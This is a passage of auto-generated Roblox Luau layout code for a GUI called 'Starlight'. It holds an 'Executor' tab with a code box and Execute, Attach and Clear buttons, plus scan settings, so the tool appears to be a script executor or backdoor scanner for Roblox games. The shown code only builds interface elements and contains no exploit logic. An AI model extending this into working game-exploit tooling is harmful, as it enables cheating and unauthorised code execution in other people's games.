STR["3b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
STR["3b"]["BackgroundTransparency"] = 1;
STR["3b"]["Size"] = UDim2.new(1, 0, 1, 0);
STR["3b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["3b"]["Text"] = [[]];
STR["3b"]["Name"] = [[Button]];


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.Y_Btm.Arrow
STR["3c"] = Instance.new("Frame", STR["3a"]);
STR["3c"]["Size"] = UDim2.new(0, 16, 0, 16);
STR["3c"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
STR["3c"]["Name"] = [[Arrow]];
STR["3c"]["BackgroundTransparency"] = 1;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.Y_Btm.Arrow.Frame
STR["3d"] = Instance.new("Frame", STR["3c"]);
STR["3d"]["BorderSizePixel"] = 0;
STR["3d"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
STR["3d"]["Size"] = UDim2.new(0, 7, 0, 1);
STR["3d"]["Position"] = UDim2.new(0, 5, 0, 7);
STR["3d"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
STR["3d"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.Y_Btm.Arrow.Frame
STR["3e"] = Instance.new("Frame", STR["3c"]);
STR["3e"]["BorderSizePixel"] = 0;
STR["3e"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
STR["3e"]["Size"] = UDim2.new(0, 5, 0, 1);
STR["3e"]["Position"] = UDim2.new(0, 6, 0, 8);
STR["3e"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
STR["3e"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.Y_Btm.Arrow.Frame
STR["3f"] = Instance.new("Frame", STR["3c"]);
STR["3f"]["BorderSizePixel"] = 0;
STR["3f"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
STR["3f"]["Size"] = UDim2.new(0, 3, 0, 1);
STR["3f"]["Position"] = UDim2.new(0, 7, 0, 9);
STR["3f"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
STR["3f"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.Y_Btm.Arrow.Frame
STR["40"] = Instance.new("Frame", STR["3c"]);
STR["40"]["BorderSizePixel"] = 0;
STR["40"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
STR["40"]["Size"] = UDim2.new(0, 1, 0, 1);
STR["40"]["Position"] = UDim2.new(0, 8, 0, 10);
STR["40"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
STR["40"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.X_Lft
STR["41"] = Instance.new("Frame", STR["26"]);
STR["41"]["Visible"] = false;
STR["41"]["ZIndex"] = 3;
STR["41"]["BorderSizePixel"] = 0;
STR["41"]["BackgroundColor3"] = Color3.fromRGB(15, 15, 15);
STR["41"]["Size"] = UDim2.new(0, 17, 0, 17);
STR["41"]["Position"] = UDim2.new(0, 0, 1, -17);
STR["41"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["41"]["Name"] = [[X_Lft]];


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.X_Lft.Button
STR["42"] = Instance.new("TextButton", STR["41"]);
STR["42"]["BorderSizePixel"] = 0;
STR["42"]["TextSize"] = 14;
STR["42"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
STR["42"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
STR["42"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
STR["42"]["BackgroundTransparency"] = 1;
STR["42"]["Size"] = UDim2.new(1, 0, 1, 0);
STR["42"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["42"]["Text"] = [[]];
STR["42"]["Name"] = [[Button]];


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.X_Lft.Arrow
STR["43"] = Instance.new("Frame", STR["41"]);
STR["43"]["Size"] = UDim2.new(0, 16, 0, 16);
STR["43"]["Name"] = [[Arrow]];
STR["43"]["BackgroundTransparency"] = 1;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.X_Lft.Arrow.Frame
STR["44"] = Instance.new("Frame", STR["43"]);
STR["44"]["BorderSizePixel"] = 0;
STR["44"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
STR["44"]["Size"] = UDim2.new(0, 1, 0, 1);
STR["44"]["Position"] = UDim2.new(0, 6, 0, 8);
STR["44"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.X_Lft.Arrow.Frame
STR["45"] = Instance.new("Frame", STR["43"]);
STR["45"]["BorderSizePixel"] = 0;
STR["45"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
STR["45"]["Size"] = UDim2.new(0, 1, 0, 3);
STR["45"]["Position"] = UDim2.new(0, 7, 0, 7);
STR["45"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.X_Lft.Arrow.Frame
STR["46"] = Instance.new("Frame", STR["43"]);
STR["46"]["BorderSizePixel"] = 0;
STR["46"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
STR["46"]["Size"] = UDim2.new(0, 1, 0, 5);
STR["46"]["Position"] = UDim2.new(0, 8, 0, 6);
STR["46"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.X_Lft.Arrow.Frame
STR["47"] = Instance.new("Frame", STR["43"]);
STR["47"]["BorderSizePixel"] = 0;
STR["47"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
STR["47"]["Size"] = UDim2.new(0, 1, 0, 7);
STR["47"]["Position"] = UDim2.new(0, 9, 0, 5);
STR["47"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.X_Rght
STR["48"] = Instance.new("Frame", STR["26"]);
STR["48"]["Visible"] = false;
STR["48"]["ZIndex"] = 3;
STR["48"]["BorderSizePixel"] = 0;
STR["48"]["BackgroundColor3"] = Color3.fromRGB(15, 15, 15);
STR["48"]["Size"] = UDim2.new(0, 17, 0, 17);
STR["48"]["Position"] = UDim2.new(1, -18, 1, -17);
STR["48"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["48"]["Name"] = [[X_Rght]];


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.X_Rght.Button
STR["49"] = Instance.new("TextButton", STR["48"]);
STR["49"]["BorderSizePixel"] = 0;
STR["49"]["TextSize"] = 14;
STR["49"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
STR["49"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
STR["49"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
STR["49"]["BackgroundTransparency"] = 1;
STR["49"]["Size"] = UDim2.new(1, 0, 1, 0);
STR["49"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["49"]["Text"] = [[]];
STR["49"]["Name"] = [[Button]];


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.X_Rght.Arrow
STR["4a"] = Instance.new("Frame", STR["48"]);
STR["4a"]["Size"] = UDim2.new(0, 16, 0, 16);
STR["4a"]["Name"] = [[Arrow]];
STR["4a"]["BackgroundTransparency"] = 1;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.X_Rght.Arrow.Frame
STR["4b"] = Instance.new("Frame", STR["4a"]);
STR["4b"]["BorderSizePixel"] = 0;
STR["4b"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
STR["4b"]["Size"] = UDim2.new(0, 1, 0, 1);
STR["4b"]["Position"] = UDim2.new(0, 10, 0, 8);
STR["4b"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.X_Rght.Arrow.Frame
STR["4c"] = Instance.new("Frame", STR["4a"]);
STR["4c"]["BorderSizePixel"] = 0;
STR["4c"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
STR["4c"]["Size"] = UDim2.new(0, 1, 0, 3);
STR["4c"]["Position"] = UDim2.new(0, 9, 0, 7);
STR["4c"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.X_Rght.Arrow.Frame
STR["4d"] = Instance.new("Frame", STR["4a"]);
STR["4d"]["BorderSizePixel"] = 0;
STR["4d"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
STR["4d"]["Size"] = UDim2.new(0, 1, 0, 5);
STR["4d"]["Position"] = UDim2.new(0, 8, 0, 6);
STR["4d"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.X_Rght.Arrow.Frame
STR["4e"] = Instance.new("Frame", STR["4a"]);
STR["4e"]["BorderSizePixel"] = 0;
STR["4e"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
STR["4e"]["Size"] = UDim2.new(0, 1, 0, 7);
STR["4e"]["Position"] = UDim2.new(0, 7, 0, 5);
STR["4e"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.Ground
STR["4f"] = Instance.new("Frame", STR["26"]);
STR["4f"]["Visible"] = false;
STR["4f"]["ZIndex"] = 2;
STR["4f"]["BorderSizePixel"] = 0;
STR["4f"]["BackgroundColor3"] = Color3.fromRGB(15, 15, 15);
STR["4f"]["Size"] = UDim2.new(0, 17, 0, 17);
STR["4f"]["Position"] = UDim2.new(1, -17, 1, -17);
STR["4f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["4f"]["Name"] = [[Ground]];


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.Y_Bar
STR["50"] = Instance.new("Frame", STR["26"]);
STR["50"]["Visible"] = false;
STR["50"]["ZIndex"] = 2;
STR["50"]["BorderSizePixel"] = 0;
STR["50"]["BackgroundColor3"] = Color3.fromRGB(91, 91, 91);
STR["50"]["Size"] = UDim2.new(0, 17, 1, -17);
STR["50"]["Position"] = UDim2.new(1, -17, 0, 0);
STR["50"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["50"]["Name"] = [[Y_Bar]];
STR["50"]["BackgroundTransparency"] = 1;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.X_Bar
STR["51"] = Instance.new("Frame", STR["26"]);
STR["51"]["Visible"] = false;
STR["51"]["ZIndex"] = 2;
STR["51"]["BorderSizePixel"] = 0;
STR["51"]["BackgroundColor3"] = Color3.fromRGB(91, 91, 91);
STR["51"]["Size"] = UDim2.new(1, -17, 0, 17);
STR["51"]["Position"] = UDim2.new(0, 0, 1, -17);
STR["51"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["51"]["Name"] = [[X_Bar]];
STR["51"]["BackgroundTransparency"] = 1;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.UICorner
STR["52"] = Instance.new("UICorner", STR["26"]);
STR["52"]["CornerRadius"] = UDim.new(0, 6);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.UIStroke
STR["53"] = Instance.new("UIStroke", STR["26"]);
STR["53"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
STR["53"]["Thickness"] = 0.7;
STR["53"]["Color"] = Color3.fromRGB(90, 90, 90);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.Execute
STR["54"] = Instance.new("TextButton", STR["24"]);
STR["54"]["BorderSizePixel"] = 0;
STR["54"]["TextSize"] = 14;
STR["54"]["AutoButtonColor"] = false;
STR["54"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
STR["54"]["BackgroundColor3"] = Color3.fromRGB(17, 17, 17);
STR["54"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
STR["54"]["Size"] = UDim2.new(0, 42, 0, 42);
STR["54"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["54"]["Text"] = [[]];
STR["54"]["Name"] = [[Execute]];
STR["54"]["Position"] = UDim2.new(0, 10, 1, -52);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.Execute.UICorner
STR["55"] = Instance.new("UICorner", STR["54"]);
STR["55"]["CornerRadius"] = UDim.new(0, 6);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.Execute.UIStroke
STR["56"] = Instance.new("UIStroke", STR["54"]);
STR["56"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
STR["56"]["Thickness"] = 1.5;
STR["56"]["Color"] = Color3.fromRGB(58, 58, 58);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.Execute.Icon
STR["57"] = Instance.new("ImageLabel", STR["54"]);
STR["57"]["Interactable"] = false;
STR["57"]["BorderSizePixel"] = 0;
STR["57"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
STR["57"]["ImageColor3"] = Color3.fromRGB(145, 145, 145);
STR["57"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
STR["57"]["Image"] = [[rbxassetid://7980684777]];
STR["57"]["Size"] = UDim2.new(0, 35, 0, 35);
STR["57"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["57"]["BackgroundTransparency"] = 1;
STR["57"]["Rotation"] = 90;
STR["57"]["Name"] = [[Icon]];
STR["57"]["Position"] = UDim2.new(0.5, 2, 0.5, 0);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.Clear
STR["58"] = Instance.new("TextButton", STR["24"]);
STR["58"]["BorderSizePixel"] = 0;
STR["58"]["TextSize"] = 14;
STR["58"]["AutoButtonColor"] = false;
STR["58"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
STR["58"]["BackgroundColor3"] = Color3.fromRGB(17, 17, 17);
STR["58"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
STR["58"]["Size"] = UDim2.new(0, 42, 0, 42);
STR["58"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["58"]["Text"] = [[]];
STR["58"]["Name"] = [[Clear]];
STR["58"]["Position"] = UDim2.new(0, 65, 1, -52);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.Clear.UICorner
STR["59"] = Instance.new("UICorner", STR["58"]);
STR["59"]["CornerRadius"] = UDim.new(0, 6);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.Clear.UIStroke
STR["5a"] = Instance.new("UIStroke", STR["58"]);
STR["5a"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
STR["5a"]["Thickness"] = 1.5;
STR["5a"]["Color"] = Color3.fromRGB(58, 58, 58);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.Clear.Icon
STR["5b"] = Instance.new("ImageLabel", STR["58"]);
STR["5b"]["Interactable"] = false;
STR["5b"]["BorderSizePixel"] = 0;
STR["5b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
STR["5b"]["ImageColor3"] = Color3.fromRGB(145, 145, 145);
STR["5b"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
STR["5b"]["Image"] = [[rbxassetid://16346922164]];
STR["5b"]["Size"] = UDim2.new(0, 35, 0, 35);
STR["5b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["5b"]["BackgroundTransparency"] = 1;
STR["5b"]["Name"] = [[Icon]];
STR["5b"]["Position"] = UDim2.new(0.5, -2, 0.5, 0);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.Attach
STR["5c"] = Instance.new("TextButton", STR["24"]);
STR["5c"]["BorderSizePixel"] = 0;
STR["5c"]["TextSize"] = 14;
STR["5c"]["AutoButtonColor"] = false;
STR["5c"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
STR["5c"]["BackgroundColor3"] = Color3.fromRGB(17, 17, 17);
STR["5c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
STR["5c"]["Size"] = UDim2.new(0, 42, 0, 42);
STR["5c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["5c"]["Text"] = [[]];
STR["5c"]["Name"] = [[Attach]];
STR["5c"]["Position"] = UDim2.new(1, -52, 1, -52);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.Attach.UICorner
STR["5d"] = Instance.new("UICorner", STR["5c"]);
STR["5d"]["CornerRadius"] = UDim.new(0, 6);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.Attach.UIStroke
STR["5e"] = Instance.new("UIStroke", STR["5c"]);
STR["5e"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
STR["5e"]["Thickness"] = 1.5;
STR["5e"]["Color"] = Color3.fromRGB(58, 58, 58);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.Attach.Icon
STR["5f"] = Instance.new("ImageLabel", STR["5c"]);
STR["5f"]["Interactable"] = false;
STR["5f"]["BorderSizePixel"] = 0;
STR["5f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
STR["5f"]["ImageColor3"] = Color3.fromRGB(145, 145, 145);
STR["5f"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
STR["5f"]["Image"] = [[rbxassetid://115736032752379]];
STR["5f"]["Size"] = UDim2.new(0, 30, 0, 30);
STR["5f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["5f"]["BackgroundTransparency"] = 1;
STR["5f"]["Name"] = [[Icon]];
STR["5f"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.ScaningText
STR["60"] = Instance.new("TextLabel", STR["24"]);
STR["60"]["BorderSizePixel"] = 0;
STR["60"]["TextSize"] = 32;
STR["60"]["TextXAlignment"] = Enum.TextXAlignment.Right;
STR["60"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
STR["60"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
STR["60"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
STR["60"]["BackgroundTransparency"] = 1;
STR["60"]["Size"] = UDim2.new(0, 0, 0, 32);
STR["60"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["60"]["Text"] = [[]];
STR["60"]["Name"] = [[ScaningText]];
STR["60"]["Position"] = UDim2.new(1, -12, 1, -48);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.R6
STR["61"] = Instance.new("TextButton", STR["24"]);
STR["61"]["BorderSizePixel"] = 0;
STR["61"]["TextSize"] = 14;
STR["61"]["AutoButtonColor"] = false;
STR["61"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
STR["61"]["BackgroundColor3"] = Color3.fromRGB(17, 17, 17);
STR["61"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
STR["61"]["Size"] = UDim2.new(0, 84, 0, 42);
STR["61"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["61"]["Text"] = [[]];
STR["61"]["Name"] = [[R6]];
STR["61"]["Position"] = UDim2.new(0, 120, 1, -52);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.R6.UICorner
STR["62"] = Instance.new("UICorner", STR["61"]);
STR["62"]["CornerRadius"] = UDim.new(0, 6);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.R6.UIStroke
STR["63"] = Instance.new("UIStroke", STR["61"]);
STR["63"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
STR["63"]["Thickness"] = 1.5;
STR["63"]["Color"] = Color3.fromRGB(58, 58, 58);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.R6.Title
STR["64"] = Instance.new("TextLabel", STR["61"]);
STR["64"]["TextWrapped"] = true;
STR["64"]["BorderSizePixel"] = 0;
STR["64"]["TextSize"] = 42;
STR["64"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
STR["64"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
STR["64"]["TextColor3"] = Color3.fromRGB(145, 145, 145);
STR["64"]["BackgroundTransparency"] = 1;
STR["64"]["Size"] = UDim2.new(1, 0, 1, 0);
STR["64"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["64"]["Text"] = [[R6]];
STR["64"]["Name"] = [[Title]];


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Scripts
STR["65"] = Instance.new("Frame", STR["21"]);
STR["65"]["BorderSizePixel"] = 0;
STR["65"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
STR["65"]["ClipsDescendants"] = true;
STR["65"]["Size"] = UDim2.new(1, 0, 1, 0);
STR["65"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["65"]["Name"] = [[Scripts]];
STR["65"]["BackgroundTransparency"] = 1;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Scripts.UICorner
STR["66"] = Instance.new("UICorner", STR["65"]);
STR["66"]["CornerRadius"] = UDim.new(0, 6);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Scripts.TextLabel
STR["67"] = Instance.new("TextLabel", STR["65"]);
STR["67"]["TextWrapped"] = true;
STR["67"]["BorderSizePixel"] = 0;
STR["67"]["TextSize"] = 53;
STR["67"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
STR["67"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
STR["67"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
STR["67"]["BackgroundTransparency"] = 1;
STR["67"]["Size"] = UDim2.new(1, 0, 1, 0);
STR["67"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["67"]["Text"] = [[Coming Soon!]];


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Settings
STR["68"] = Instance.new("Frame", STR["21"]);
STR["68"]["Visible"] = false;
STR["68"]["BorderSizePixel"] = 0;
STR["68"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
STR["68"]["ClipsDescendants"] = true;
STR["68"]["Size"] = UDim2.new(1, 0, 1, 0);
STR["68"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["68"]["Name"] = [[Settings]];
STR["68"]["BackgroundTransparency"] = 1;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Settings.UICorner
STR["69"] = Instance.new("UICorner", STR["68"]);
STR["69"]["CornerRadius"] = UDim.new(0, 6);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Settings.Console
STR["6a"] = Instance.new("ScrollingFrame", STR["68"]);
STR["6a"]["Active"] = true;
STR["6a"]["BorderSizePixel"] = 0;
STR["6a"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
STR["6a"]["TopImage"] = [[rbxasset://textures/ui/Scroll/scroll-middle.png]];
STR["6a"]["BackgroundColor3"] = Color3.fromRGB(17, 17, 17);
STR["6a"]["Name"] = [[Console]];
STR["6a"]["BottomImage"] = [[rbxasset://textures/ui/Scroll/scroll-middle.png]];
STR["6a"]["AutomaticCanvasSize"] = Enum.AutomaticSize.XY;
STR["6a"]["Size"] = UDim2.new(0, 300, 1, -20);
STR["6a"]["Position"] = UDim2.new(0, 10, 0, 10);
STR["6a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["6a"]["ScrollBarThickness"] = 8;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Settings.Console.UIStroke
STR["6b"] = Instance.new("UIStroke", STR["6a"]);
STR["6b"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
STR["6b"]["Thickness"] = 0.7;
STR["6b"]["Color"] = Color3.fromRGB(90, 90, 90);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Settings.Console.UICorner
STR["6c"] = Instance.new("UICorner", STR["6a"]);
STR["6c"]["CornerRadius"] = UDim.new(0, 6);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Settings.Console.Example
STR["6d"] = Instance.new("TextLabel", STR["6a"]);
STR["6d"]["BorderSizePixel"] = 0;
STR["6d"]["TextSize"] = 15;
STR["6d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
STR["6d"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
STR["6d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
STR["6d"]["BackgroundTransparency"] = 1;
STR["6d"]["Visible"] = false;
STR["6d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["6d"]["Text"] = [[]];
STR["6d"]["AutomaticSize"] = Enum.AutomaticSize.XY;
STR["6d"]["Name"] = [[Example]];


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Settings.Console.UIListLayout
STR["6e"] = Instance.new("UIListLayout", STR["6a"]);
STR["6e"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Settings.Title1
STR["6f"] = Instance.new("TextLabel", STR["68"]);
STR["6f"]["BorderSizePixel"] = 0;
STR["6f"]["TextSize"] = 32;
STR["6f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
STR["6f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
STR["6f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
STR["6f"]["BackgroundTransparency"] = 1;
STR["6f"]["Size"] = UDim2.new(0, 0, 0, 32);
STR["6f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["6f"]["Text"] = [[Scan Type]];
STR["6f"]["AutomaticSize"] = Enum.AutomaticSize.X;
STR["6f"]["Name"] = [[Title1]];
STR["6f"]["Position"] = UDim2.new(0, 350, 0, 10);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Settings.EventCheckbox
STR["70"] = Instance.new("Frame", STR["68"]);
STR["70"]["BorderSizePixel"] = 0;
STR["70"]["BackgroundColor3"] = Color3.fromRGB(17, 17, 17);
STR["70"]["Size"] = UDim2.new(0, 24, 0, 24);
STR["70"]["Position"] = UDim2.new(0, 325, 0, 45);
STR["70"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["70"]["Name"] = [[EventCheckbox]];


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Settings.EventCheckbox.UIStroke
STR["71"] = Instance.new("UIStroke", STR["70"]);
STR["71"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
STR["71"]["Thickness"] = 0.7;
STR["71"]["Color"] = Color3.fromRGB(90, 90, 90);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Settings.EventCheckbox.UICorner
STR["72"] = Instance.new("UICorner", STR["70"]);
STR["72"]["CornerRadius"] = UDim.new(0, 6);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Settings.EventCheckbox.Button
STR["73"] = Instance.new("TextButton", STR["70"]);
STR["73"]["BorderSizePixel"] = 0;
STR["73"]["TextSize"] = 14;
STR["73"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
STR["73"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
STR["73"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
STR["73"]["BackgroundTransparency"] = 1;
STR["73"]["Size"] = UDim2.new(1, 0, 1, 0);
STR["73"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["73"]["Text"] = [[]];
STR["73"]["Name"] = [[Button]];


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Settings.EventCheckbox.Icon
STR["74"] = Instance.new("ImageLabel", STR["70"]);
STR["74"]["BorderSizePixel"] = 0;
STR["74"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
STR["74"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
STR["74"]["Image"] = [[rbxassetid://12690727184]];
STR["74"]["Size"] = UDim2.new(0, 12, 0, 12);
STR["74"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["74"]["BackgroundTransparency"] = 1;
